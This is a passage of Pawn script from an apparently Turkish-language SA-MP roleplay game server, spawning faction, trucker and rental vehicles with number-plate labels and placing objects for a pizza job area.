	FBIVehicles[3] = AddStaticVehicleEx(402,287.9204,-1522.4076,24.4254,233.3578,0,0,2000); // FBI car 4
	FBIVehicles[4] = AddStaticVehicleEx(402,291.0083,-1518.0157,24.4255,235.8604,0,0,2000); // FBI car 5
	FBIVehicles[5] = AddStaticVehicleEx(426,294.4281,-1513.3267,24.3367,233.7115,0,0,2000); // FBI car 6
	FBIVehicles[6] = AddStaticVehicleEx(426,297.6391,-1508.7694,24.3367,233.2394,0,0,2000); // FBI car 7
	FBIVehicles[7] = AddStaticVehicleEx(482,301.1381,-1504.8762,24.7139,233.2884,0,0,2000); // FBI Car 8
	FBIVehicles[8] = AddStaticVehicleEx(415,304.2608,-1486.6423,24.2188,235.1092,0,0,2000); // FBI Car 9
    FBIVehicles[9] = AddStaticVehicleEx(415,307.1080,-1482.1565,24.2188,234.6429,0,0,2000); // FBI Car 10
    FBIVehicles[10] = AddStaticVehicleEx(487, 316.47, -1516.18, 77.24, 228.39, 0, 79, 2000); //  Levithian - FBI Roof
    FBIVehicles[11] = AddStaticVehicleEx(487, 329.79, -1500.35, 77.24, 222.55, 0, 79, 2000); //  Levithian - FBI Roof
    FBIVehicles[12] = AddStaticVehicleEx(427, 300.645629, -1490.589233, 24.723447, 233.09, 0, 0, 2000); //  FBI Enforcer
    FBIVehicles[13] = AddStaticVehicleEx(560, 294.8336, -1540.6174, 24.2991, 54.4162, 0, 0, 2000); //  FBI Phoenix Role Play
    FBIVehicles[14] = AddStaticVehicleEx(560, 292.0438, -1545.2189, 24.2991, 55.1461, 0, 0, 2000); //  FBI Phoenix Role Play
	
	for(new x;x<sizeof(FBIVehicles);x++)
	{
	    format(string, sizeof(string), "FBI %d", FBIVehicles[x]);
	    SetVehicleNumberPlate(FBIVehicles[x], string);
	    format(string,sizeof(string),"FBI %d",FBIVehicles[x]);
        fbiplaka = Create3DTextLabel(string, 0x9ACD32AA,30.0,40.0,50.0,40.0,0);
        Attach3DTextLabelToVehicle(fbiplaka, FBIVehicles[x], 0.0, -0.2, 1.4 );

	}

	// LSFMD
   	LSFMDVehicles[1] = AddStaticVehicleEx(452,721.1721,-1628.0261,-0.6700,180.6752,1,53, VEHICLE_RESPAWN); // LSFD Boat 2
	LSFMDVehicles[2] = AddStaticVehicleEx(452,720.1046,-1693.4014,-0.4581,179.7505,1,35, VEHICLE_RESPAWN); // LSFD Boat 3
	LSFMDVehicles[3] = AddStaticVehicleEx(416,1607.2472,-2153.6628,13.7036,88.4947,1,3, VEHICLE_RESPAWN); // FDA Ambulance
	LSFMDVehicles[4] = AddStaticVehicleEx(416,1590.8926,-2152.0854,13.7039,268.5291,1,3, VEHICLE_RESPAWN); // LSFMD ambulance
	LSFMDVehicles[5] = AddStaticVehicleEx(416,1590.9957,-2159.7983,13.7047,269.8668,1,3, VEHICLE_RESPAWN); // LSFMD ambulance
	LSFMDVehicles[6] = AddStaticVehicleEx(416,1591.0316,-2167.6848,13.7039,269.8569,1,3, VEHICLE_RESPAWN); // LSFMD ambulance
	LSFMDVehicles[7] = AddStaticVehicleEx(407, 1544.7987060547, -2173.884765625, 13.916874885559, 270, -1, -1, VEHICLE_RESPAWN); //Ambulance
    LSFMDVehicles[8] = AddStaticVehicleEx(407, 1544.7987060547, -2165.47265625, 13.916874885559, 270, -1, -1, VEHICLE_RESPAWN); //Ambulance
	LSFMDVehicles[9] = AddStaticVehicleEx(544, 1513.0217285156, -2173.1804199219, 13.916874885559, 90, -1, -1, VEHICLE_RESPAWN);//Ambulance
	LSFMDVehicles[10] = AddStaticVehicleEx(416, 87.18, -160.59, 2.74, 357.75, 1, 3, VEHICLE_RESPAWN);//Ambulance - LSFMD Sub Station
	LSFMDVehicles[11] = AddStaticVehicleEx(490, 97.63, -171.87, 2.75, 271.18, 3, 1, VEHICLE_RESPAWN); // LSFMD Rancher - Sub Station
	LSFMDVehicles[12] = AddStaticVehicleEx(407, 95.26, -164.77, 2.82, 269.32, 3, 1, VEHICLE_RESPAWN); // Fire Truck - Sub Station
	LSFMDVehicles[13] = AddStaticVehicleEx(563, 152.42, -167.52, 2.28, 92.43, 3, 1, VEHICLE_RESPAWN); // Raindance - Sub Station
	LSFMDVehicles[14] = AddStaticVehicleEx(416,1220.61, 301.97, 19.70, 155.82,1,3, VEHICLE_RESPAWN); // Memorial - Ambulance
	LSFMDVehicles[15] = AddStaticVehicleEx(416,1227.83, 298.53, 19.70, 155.16,1,3, VEHICLE_RESPAWN); // Memorial - Ambulance
	LSFMDVehicles[16] = AddStaticVehicleEx(563,1230.78, 318.34, 25.46, 153.57,1,3, VEHICLE_RESPAWN); // Memorial - Raindance
	LSFMDVehicles[17] = AddStaticVehicleEx(416,1609.2712,-2181.0779,13.7039,177.3877,1,3, VEHICLE_RESPAWN); // LSFD Ambulance
	LSFMDVehicles[18] = AddStaticVehicleEx(554,1580.2485,-2147.9507,13.6308,270.7723,3,1, VEHICLE_RESPAWN); // LSFD Car
	LSFMDVehicles[19] = AddStaticVehicleEx(554,1545.3405,-2183.1868,13.6328,269.7860,3,1, VEHICLE_RESPAWN); // LSFD Car 2
	LSFMDVehicles[20] = AddStaticVehicleEx(416,1179.9149,-1308.8851,13.8767,268.7781,1,3, VEHICLE_RESPAWN); //Ambulance 1
	LSFMDVehicles[21] = AddStaticVehicleEx(416,1179.3976,-1338.5197,13.9653,270.0616,1,3, VEHICLE_RESPAWN); //Ambulance 2
	LSFMDVehicles[22] = AddStaticVehicleEx(416,2036.9012,-1425.9266,17.1406,359.5312,1,3, VEHICLE_RESPAWN); //Ambulance 3
	LSFMDVehicles[23] = AddStaticVehicleEx(416,2008.3009,-1411.0936,17.1413,88.3472,1,3, VEHICLE_RESPAWN); //Ambulance 4
	LSFMDVehicles[24] = AddStaticVehicleEx(407,1545.6364,-2155.6382,13.7988,273.9738,3,1, VEHICLE_RESPAWN); //Ambulance 5
	LSFMDVehicles[25] = AddStaticVehicleEx(407,1516.0275,-2162.9231,13.7834,89.9683,3,1, VEHICLE_RESPAWN); //Ambulance 6
	LSFMDVehicles[26] = AddStaticVehicleEx(416,1606.9974,-2167.0830,13.7039,91.1709,1,3, VEHICLE_RESPAWN); //Ambulance 7
	LSFMDVehicles[27] = AddStaticVehicleEx(416,1607.3264,-2148.6665,13.7040,89.7026,1,3, VEHICLE_RESPAWN); //Ambulance 8
	LSFMDVehicles[28] = AddStaticVehicleEx(490,1616.3599,-2144.3535,13.6824,88.7370,3,1, VEHICLE_RESPAWN); // LSFMDFBIRANCHER main station
	LSFMDVehicles[29] = AddStaticVehicleEx(490,1628.9847,-2151.2844,13.6831,269.9678,3,1, VEHICLE_RESPAWN); // LSFMDFBIRANCHER sub station new
    LSFMDVehicles[30] = AddStaticVehicleEx(416,-2668.79589844,605.40057373,14.75412750,180.00000000,1,3,VEHICLE_RESPAWN); //Ambulance
	LSFMDVehicles[31] = AddStaticVehicleEx(416,-2662.53906250,605.74005127,14.75412750,180.00000000,1,3,VEHICLE_RESPAWN); //Ambulance
	LSFMDVehicles[32] = AddStaticVehicleEx(416,-2655.28808594,605.89562988,14.75412750,180.00000000,1,3,VEHICLE_RESPAWN); //Ambulance
	LSFMDVehicles[33] = AddStaticVehicleEx(407,-2021.93737793,84.03466797,28.25847435,270.00000000,3,1,VEHICLE_RESPAWN); //Firetruck
	LSFMDVehicles[34] = AddStaticVehicleEx(407,-2022.07055664,92.80475616,28.41874695,270.00000000,3,1,VEHICLE_RESPAWN); //Firetruck
	LSFMDVehicles[35] = AddStaticVehicleEx(407,-2022.19433594,76.03833008,28.25847435,270.00000000,3,11,VEHICLE_RESPAWN); //Firetruck
	LSFMDVehicles[36] = AddStaticVehicleEx(563,1633.9830,-2180.9321,14.2601,267.5514,3,1,VEHICLE_RESPAWN); // fda raindance
	LSFMDVehicles[37] = AddStaticVehicleEx(563,1489.1141,-2168.0686,14.2523,180.3227,3,1,VEHICLE_RESPAWN); // raindance 2
	LSFMDVehicles[38] = AddStaticVehicleEx(487,-2703.3201,624.0250,14.1766,180.2649, 1, 3, VEHICLE_RESPAWN);//Medic Chopper/*Maverick*/
	LSFMDVehicles[39] = AddStaticVehicleEx(487, 1610.3516,-2180.1248,19.9312,354.8875,1, 3, VEHICLE_RESPAWN);//Medic Chopper/*Maverick*/ -- in LS
	LSFMDVehicles[40] = AddStaticVehicleEx(487, 1620.5365,-2179.8254,19.9498,5.4440,1, 3, VEHICLE_RESPAWN);//Medic Chopper/*Maverick*/ -- in LS
	LSFMDVehicles[41] = AddStaticVehicleEx(426, 1183.1443,-1332.0535,13.3243,359.4417,3, 3, VEHICLE_RESPAWN);// Premier
	LSFMDVehicles[42] = AddStaticVehicleEx(426, 1183.1385,-1315.3483,13.3159,180.3400,3, 3, VEHICLE_RESPAWN);//Premier

    for(new x;x<sizeof(LSFMDVehicles);x++) {
	    format(string, sizeof(string), "LSFMD %d", LSFMDVehicles[x]);
	    SetVehicleNumberPlate(LSFMDVehicles[x], string);
	    SetVehicleToRespawn(LSFMDVehicles[x]);
	    format(string,sizeof(string),"LSFMD %d",LSFMDVehicles[x]);
        lsfmdplaka = Create3DTextLabel(string, 0x9ACD32AA,30.0,40.0,50.0,40.0,0);
        Attach3DTextLabelToVehicle(lsfmdplaka, LSFMDVehicles[x], 0.0, -0.2, 1.4 );
	}

	// Government vehicles
	GovVehicles[0] = AddStaticVehicleEx(426,1535.2615,-1824.3556,13.2893,0.2170,0,0, VEHICLE_RESPAWN); //
	GovVehicles[1] = AddStaticVehicleEx(426,1530.2271,-1824.5143,13.2971,1.3904,0,0, VEHICLE_RESPAWN); //
	GovVehicles[2] = AddStaticVehicleEx(426,1525.0137,-1824.4403,13.2960,1.5618,0,0, VEHICLE_RESPAWN); //
	GovVehicles[3] = AddStaticVehicleEx(426,1520.0966,-1824.6272,13.2962,0.6993,0,0, VEHICLE_RESPAWN); //
	GovVehicles[4] = AddStaticVehicleEx(426,1515.2321,-1824.7119,13.2958,359.0856,0,0, VEHICLE_RESPAWN); //
	GovVehicles[5] = AddStaticVehicleEx(426,1510.2791,-1824.8235,13.2959,359.7829,0,0, VEHICLE_RESPAWN); //
	GovVehicles[6] = AddStaticVehicleEx(426,1504.9182,-1824.9270,13.2961,358.4856,0,0, VEHICLE_RESPAWN); //
	GovVehicles[7] = AddStaticVehicleEx(507,1499.9515,-1824.6877,13.3780,359.5751,0,0, VEHICLE_RESPAWN); //
	GovVehicles[8] = AddStaticVehicleEx(507,1489.5093,-1824.4470,13.3781,0.2054,0,0, VEHICLE_RESPAWN); //
	GovVehicles[9] = AddStaticVehicleEx(507,1484.8929,-1824.5314,13.3782,359.7654,0,0, VEHICLE_RESPAWN); //
	GovVehicles[10] = AddStaticVehicleEx(507,1479.3285,-1824.6111,13.3775,0.5924,0,0, VEHICLE_RESPAWN); //
	GovVehicles[11] = AddStaticVehicleEx(426,1474.5159,-1824.4930,13.3787,359.8407,0,0, VEHICLE_RESPAWN); //
	GovVehicles[12] = AddStaticVehicleEx(426,1469.5892,-1824.4733,13.3813,359.6451,0,0, VEHICLE_RESPAWN); //
	GovVehicles[13] = AddStaticVehicleEx(560,1464.4290,-1824.4639,13.3861,359.3273,0,0, VEHICLE_RESPAWN); //
	GovVehicles[14] = AddStaticVehicleEx(560,1459.4259,-1824.4542,13.3862,359.1971,0,0, VEHICLE_RESPAWN); //
	GovVehicles[15] = AddStaticVehicleEx(409,1454.3655,-1823.9966,13.3528,359.5281,0,0, VEHICLE_RESPAWN); //
	GovVehicles[16] = AddStaticVehicleEx(409,1450.5977,-1796.4385,13.3528,179.1563,0,0, VEHICLE_RESPAWN); //
	GovVehicles[17] = AddStaticVehicleEx(560,1455.4796,-1795.7983,13.2580,178.9466,0,0, VEHICLE_RESPAWN); //
	GovVehicles[18] = AddStaticVehicleEx(560,1460.2428,-1795.7638,13.2580,181.0739,0,0, VEHICLE_RESPAWN); //
	GovVehicles[19] = AddStaticVehicleEx(560,1465.7693,-1795.8021,13.2580,179.6162,0,0, VEHICLE_RESPAWN); //
	GovVehicles[20] = AddStaticVehicleEx(560,1470.6934,-1795.8033,13.2579,179.5175,0,0, VEHICLE_RESPAWN); //
	GovVehicles[21] = AddStaticVehicleEx(426,1475.7825,-1795.9221,13.2957,179.1298,0,0, VEHICLE_RESPAWN); //
	GovVehicles[22] = AddStaticVehicleEx(426,1480.7526,-1795.9052,13.2957,180.4029,0,0, VEHICLE_RESPAWN); //
	GovVehicles[23] = AddStaticVehicleEx(426,1485.7577,-1795.8369,13.2957,180.1235,0,0, VEHICLE_RESPAWN); //
	GovVehicles[24] = AddStaticVehicleEx(426,1490.9355,-1795.9092,13.2958,179.4610,0,0, VEHICLE_RESPAWN); //
	GovVehicles[25] = AddStaticVehicleEx(490,1495.8885,-1796.0385,13.6808,180.0047,0,0, VEHICLE_RESPAWN); //
	GovVehicles[26] = AddStaticVehicleEx(490,1500.9927,-1795.9918,13.6809,180.3000,0,0, VEHICLE_RESPAWN); //
	GovVehicles[27] = AddStaticVehicleEx(490,1506.0988,-1795.9641,13.6808,180.1443,0,0, VEHICLE_RESPAWN); //
	GovVehicles[28] = AddStaticVehicleEx(490,1511.0916,-1795.7998,13.6807,180.2188,0,0, VEHICLE_RESPAWN); //
	GovVehicles[29] = AddStaticVehicleEx(487,1516.7325,-1809.7002,45.6726,359.1588,0,0, VEHICLE_RESPAWN); // MAVER
	GovVehicles[30] = AddStaticVehicleEx(487,1445.0769,-1808.6434,45.6863,359.1588,0,0, VEHICLE_RESPAWN); // MAVER


	// Made these mavericks available for public use for now
	AddStaticVehicleEx(487,1116.52880859,-2055.13989258,74.69468689,0.00000000,0, 0, VEHICLE_RESPAWN); //Maverick
	AddStaticVehicleEx(487,1115.95190430,-2019.10473633,74.69468689,180.00000000,0, 0, VEHICLE_RESPAWN); //Maverick

	for(new x;x<sizeof(GovVehicles);x++) {
	    format(string, sizeof(string), "GOV %d", GovVehicles[x]);
	    SetVehicleNumberPlate(GovVehicles[x], string);
	    SetVehicleToRespawn(GovVehicles[x]);
	    format(string,sizeof(string),"GOV %d",GovVehicles[x]);
        govplaka = Create3DTextLabel(string, 0x9ACD32AA,30.0,40.0,50.0,40.0,0);
        Attach3DTextLabelToVehicle(govplaka, GovVehicles[x], 0.0, -0.2, 1.4 );
	}

	// SANews vehicles
    SANVehicles[0] = AddStaticVehicleEx(582,740.6042480469,-1334.6889648438,13.6949853897,180.5405273438,49,11,2000); //Newsvan
	SANVehicles[1] = AddStaticVehicleEx(582,745.6818237305,-1334.6668701172,13.6950349808,180.5405273438,49,11,2000); //Newsvan
	SANVehicles[2] = AddStaticVehicleEx(582,750.3946533203,-1334.4571533203,13.6954946518,180.6304321289,49,11,2000); //Newsvan
	SANVehicles[3] = AddStaticVehicleEx(582,755.1726684570,-1334.3752441406,13.6956758499,180.5405273438,49,11,2000); //Newsvan
	SANVehicles[4] = AddStaticVehicleEx(582,760.6042480469,-1334.6889648438,13.6949853897,180.5405273438,49,11,2000); //Newsvan
	SANVehicles[5] = AddStaticVehicleEx(582,765.6818237305,-1334.6668701172,13.6950349808,180.5405273438,49,11,2000); //Newsvan
	SANVehicles[6] = AddStaticVehicleEx(582,770.3946533203,-1334.4571533203,13.6954946518,180.6304321289,49,11,2000); //Newsvan
	SANVehicles[7] = AddStaticVehicleEx(582,775.1726684570,-1334.3752441406,13.6956758499,180.5405273438,49,11,2000); //Newsvan
	SANVehicles[8] = AddStaticVehicleEx(582,780.1726684570,-1334.3752441406,13.6956758499,180.5405273438,49,11,2000); //Newsvan
	SANVehicles[9] = AddStaticVehicleEx(582,785.1726684570,-1334.3752441406,13.6956758499,180.5405273438,49,11,2000); //Newsvan
	SANVehicles[10] = AddStaticVehicleEx(488,743.5921630859,-1366.7655029297,25.9572105408,0.0000000000,49,11,2000); //Helikopter
	SANVehicles[11] = AddStaticVehicleEx(488,735.5921630859,-1366.7655029297,25.9572105408,0.0000000000,49,11,2000); //Helikopter

	for(new x;x<sizeof(SANVehicles);x++) {
	    format(string, sizeof(string), "SAN %d", SANVehicles[x]);
	    SetVehicleNumberPlate(SANVehicles[x], string);
	    SetVehicleToRespawn(SANVehicles[x]);
    	format(string,sizeof(string),"SAN %d",SANVehicles[x]);
        sanplaka = Create3DTextLabel(string, 0x9ACD32AA,30.0,40.0,50.0,40.0,0);
        Attach3DTextLabelToVehicle(sanplaka, SANVehicles[x], 0.0, -0.2, 1.4 );
	}

    // Trucker Vehicles
   	TruckerVehicles[0] = AddStaticVehicleEx(456,2223.45068359,-2675.48315430,13.79090691,0.00000000,-1,-1,300); //Yankee
	TruckerVehicles[1] = AddStaticVehicleEx(456,2229.94897461,-2675.69653320,13.79090691,0.00000000,-1,-1,300); //Yankee
	TruckerVehicles[2] = AddStaticVehicleEx(456,2247.59399414,-2678.06005859,13.79090691,0.00000000,-1,-1,300); //Yankee
	TruckerVehicles[3] = AddStaticVehicleEx(414,2252.95361328,-2678.02856445,13.70086479,0.00000000,-1,-1,300); //Mule
	TruckerVehicles[4] = AddStaticVehicleEx(414,2257.94824219,-2677.81347656,13.70086479,0.00000000,-1,-1,300); //Mule
	TruckerVehicles[5] = AddStaticVehicleEx(414,2263.20507812,-2677.70410156,13.70086479,0.00000000,-1,-1,300); //Mule
	TruckerVehicles[6] = AddStaticVehicleEx(456,2165.29052734,-2657.01904297,13.79687500,270.00000000,-1,-1,300); //Yankee
	TruckerVehicles[7] = AddStaticVehicleEx(456,2167.83178711,-2650.11987305,13.79687500,270.00000000,-1,-1,300); //Yankee
	TruckerVehicles[8] = AddStaticVehicleEx(456,2203.90942383,-2641.51489258,13.79687500,270.00000000,-1,-1,300); //Yankee
	TruckerVehicles[9] = AddStaticVehicleEx(499,2175.12963867,-2637.71411133,13.64687538,180.00000000,-1,-1,300); //Benson
	TruckerVehicles[10] = AddStaticVehicleEx(499,2180.41625977,-2638.07910156,13.64687538,180.00000000,-1,-1,300); //Benson
	TruckerVehicles[11] = AddStaticVehicleEx(499,2185.71166992,-2638.12036133,13.64687538,180.00000000,-1,-1,300); //Benson
	TruckerVehicles[12] = AddStaticVehicleEx(414,2205.19726562,-2597.21484375,13.69090652,270.00000000,-1,-1,300); //Mule
	TruckerVehicles[13] = AddStaticVehicleEx(499,2213.06250000,-2583.26538086,13.64687538,0.00000000,-1,-1,300); //Benson
	TruckerVehicles[14] = AddStaticVehicleEx(456,2204.75000000,-2569.27026367,13.79687500,270.00000000,-1,-1,300); //Yankee
	TruckerVehicles[15] = AddStaticVehicleEx(456,2239.31396484,-2644.32055664,13.79451466,90.00000000,-1,-1,300); //Yankee
	TruckerVehicles[16] = AddStaticVehicleEx(456,2239.52050781,-2638.99414062,13.79451466,90.00000000,-1,-1,300); //Yankee
	TruckerVehicles[17] = AddStaticVehicleEx(456,2239.46142578,-2633.49414062,13.79451466,90.00000000,-1,-1,300); //Yankee
	TruckerVehicles[18] = AddStaticVehicleEx(456,2239.34033203,-2627.85107422,13.79451466,90.00000000,-1,-1,300); //Yankee
	TruckerVehicles[19] = AddStaticVehicleEx(456,2206.29296875,-2530.18920898,13.79687500,270.00000000,-1,-1,300); //Yankee
	TruckerVehicles[20] = AddStaticVehicleEx(456,2206.20117188,-2524.10937500,13.79687500,270.00000000,-1,-1,300); //Yankee
	TruckerVehicles[21] = AddStaticVehicleEx(456,2206.03466797,-2518.52441406,13.79687500,270.00000000,-1,-1,300); //Yankee

    // Paintball (pickup + 3dtextlabel)
    CreateDynamic3DTextLabel("Paintball v1 - Oynamak için /paintball",COLOR_WHITE, 1782.872680, -1565.576049, 13.347187+0.5,10.0);
    CreatePickup(1254, 23, 1782.872680, -1565.576049, 13.347187, -1);

	// Added by Calgon (extra vehicles really needed)
	TruckerVehicles[22] = AddStaticVehicle(456,2453.1619,-2639.1846,13.8379,270.4689,102,300); // Ocean Docks 1
	TruckerVehicles[23] = AddStaticVehicle(456,2473.5852,-2639.2966,13.8242,268.3057,102,300); // Ocean Docks 2
	TruckerVehicles[24] = AddStaticVehicle(456,2453.1306,-2649.3818,13.8346,271.3797,102,300); // Ocean Docks 3
	TruckerVehicles[25] = AddStaticVehicle(456,2471.5981,-2649.7627,13.8288,269.0897,102,300); // Ocean Docks 4
	TruckerVehicles[26] = AddStaticVehicle(456,2393.3713,-2670.7224,13.8374,89.5815,102,300); // Ocean Docks 5
	TruckerVehicles[27] = AddStaticVehicle(456,2397.2883,-2627.0601,13.8374,358.5510,102,300); // Ocean Docks 6
	TruckerVehicles[28] = AddStaticVehicle(456,2397.9001,-2602.9380,13.8374,358.5483,102,300); // Ocean Docks 7
	TruckerVehicles[29] = AddStaticVehicle(456,2203.0491,-2632.2080,13.2632,91.2853,53,300); // Ocean Docks Truck x1 (needs model)
	TruckerVehicles[30] = AddStaticVehicle(456,2247.2212,-2605.2102,8.0225,356.8250,53,300); // Ocean Docks Truck x2 (needs model)
	TruckerVehicles[31] = AddStaticVehicle(456,2248.7383,-2577.7927,8.0144,356.8441,53,300); // Ocean Docks Truck x3 (needs model)
	TruckerVehicles[32] = AddStaticVehicle(456,2248.7473,-2556.0659,8.0211,359.6938,53,300); // Ocean Docks Truck x4 (needs model)
	TruckerVehicles[33] = AddStaticVehicle(456,2248.8784,-2531.6667,8.0229,359.6888,53,300); // Ocean Docks Truck x5 (needs model)
	TruckerVehicles[34] = AddStaticVehicle(456,2248.9675,-2515.1245,8.0156,359.6818,53,300); // Ocean Docks Truck x6 (needs model)
	TruckerVehicles[35] = AddStaticVehicle(456,2249.0857,-2494.2341,8.0111,359.7150,53,300); // Ocean Docks Truck x7 (needs model)
	TruckerVehicles[36] = AddStaticVehicle(456,2264.4348,-2484.6040,8.0058,261.9050,53,300); // Ocean Docks Truck x8 (needs model)
	
	for(new x;x<sizeof(TruckerVehicles);x++) {
	    format(string, sizeof(string), " KMN %d", TruckerVehicles[x]);
	    SetVehicleNumberPlate(TruckerVehicles[x], string);
	    SetVehicleToRespawn(TruckerVehicles[x]);
    	format(string,sizeof(string),"KMN %d",TruckerVehicles[x]);
        kamyonplaka = Create3DTextLabel(string, 0x9ACD32AA,30.0,40.0,50.0,40.0,0);
        Attach3DTextLabelToVehicle(kamyonplaka, TruckerVehicles[x], 0.0, -0.2, 1.4 );
	}
	
	//Tamirci Araclar
	AddStaticVehicle(525,1948.8640,-1884.2042,13.5474,1.3887,0,0);
	AddStaticVehicle(525,1921.2944,-1855.7573,13.5619,262.3745,0,0);
	
   // Kiralama Sistemi
	RentableCar[0] = CreateVehicle(426, 1834.887084, -1869.552612, 13.389747, 360.0, -1, -1, VEHICLE_RESPAWN); // Premier
	RentableCar[1] = CreateVehicle(426, 1838.887084, -1869.552612, 13.389747, 360.0, -1, -1, VEHICLE_RESPAWN); // Premier
	RentableCar[2] = CreateVehicle(426, 1842.887084, -1869.552612, 13.389747, 360.0, -1, -1, VEHICLE_RESPAWN); // Premier
	RentableCar[3] = CreateVehicle(426, 1836.648925, -1854.549804, 13.389747, 180.0, -1, -1, VEHICLE_RESPAWN); // Premier
	RentableCar[4] = CreateVehicle(426, 1840.648925, -1854.549804, 13.389747, 180.0, -1, -1, VEHICLE_RESPAWN); // Premier
	RentableCar[5] = CreateVehicle(510, 1829.9003, -1851.5295, 13.6956, 88.9800, -1, -1, VEHICLE_RESPAWN);
    RentableCar[6] = CreateVehicle(510, 1829.8795, -1852.3306, 13.6956, 88.9800, -1, -1, VEHICLE_RESPAWN);
    RentableCar[7] = CreateVehicle(510, 1829.7184, -1853.2367, 13.6956, 88.9800, -1, -1, VEHICLE_RESPAWN);
    RentableCar[8] = CreateVehicle(510, 1829.7417, -1855.0747, 13.6956, 88.9800, -1, -1, VEHICLE_RESPAWN);
    RentableCar[9] = CreateVehicle(510, 1829.7413, -1854.1074, 13.6956, 88.9800, -1, -1, VEHICLE_RESPAWN);

	for(new x;x<sizeof(RentableCar);x++) {
	    format(string, sizeof(string), "KIRALIK %d", RentableCar[x]);
	    SetVehicleNumberPlate(RentableCar[x], string);
	    SetVehicleToRespawn(RentableCar[x]);
    	format(string,sizeof(string),"KIRALIK %d",RentableCar[x]);
        kiraplaka = Create3DTextLabel(string, 0x9ACD32AA,30.0,40.0,50.0,40.0,0);
        Attach3DTextLabelToVehicle(kiraplaka, RentableCar[x], 0.0, -0.2, 1.4 );
	}

		//pizza
		CreateDynamicObject(970, 2097.77515, -1802.30432, 12.93400,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(970, 2093.73999, -1811.71301, 12.93400,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(970, 2094.24609, -1791.09094, 12.94000,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(970, 2097.77515, -1791.08203, 12.94000,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(970, 2093.74316, -1802.30432, 12.93400,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(970, 2097.77515, -1822.30396, 12.93400,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(970, 2097.77515, -1811.71289, 12.93400,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(970, 2093.71899, -1822.30396, 12.93400,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(983, 2123.67603, -1782.81995, 13.07200,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(983, 2123.65894, -1776.45496, 13.07500,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(983, 2123.66699, -1770.10303, 13.07800,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(983, 2123.64990, -1765.36304, 13.08000,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1728, 2134.77295, -1818.91797, 12.54500,   0.00000, 0.00000, -90.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(2311, 2130.35132, -1819.22632, 12.55700,   0.00000, 0.00000, -90.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(931, 2122.58203, -1823.15698, 13.61900,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(2043, 2131.08154, -1820.46472, 12.66000,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(2359, 2131.12305, -1819.50073, 12.75800,   0.00000, 0.00000, 90.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(3630, 2130.37207, -1829.94397, 14.04500,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1748, 2130.02734, -1819.63599, 13.06200,   0.00000, 0.00000, 90.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(947, 2134.32202, -1824.40100, 14.75800,   0.00000, 0.00000, 90.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(2114, 2134.47192, -1822.76501, 12.69600,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1512, 2130.10791, -1819.04382, 13.26000,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1510, 2130.57251, -1819.18005, 13.07400,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1543, 2135.01099, -1818.54297, 12.54300,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1543, 2134.99292, -1818.29602, 12.54300,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1543, 2134.76611, -1818.40601, 12.54400,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1543, 2135.13403, -1818.14001, 12.54200,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1543, 2134.91309, -1818.00598, 12.54300,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1543, 2134.75098, -1818.18103, 12.54400,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1543, 2134.57104, -1818.19397, 12.54600,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1543, 2134.69507, -1817.97705, 12.54500,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1543, 2135.00610, -1817.78503, 12.54200,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1543, 2135.08203, -1817.96399, 12.54200,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1543, 2134.79492, -1817.82996, 12.54400,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1543, 2134.43604, -1818.34204, 12.54700,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1543, 2134.71094, -1818.56995, 12.54500,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1544, 2130.31421, -1820.88672, 13.05000,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
		CreateDynamicObject(1544, 2135.13281, -1821.67273, 12.54500,   0.00000, 0.00000, 0.00000, -1, -1, -1, 300.00,300.00);
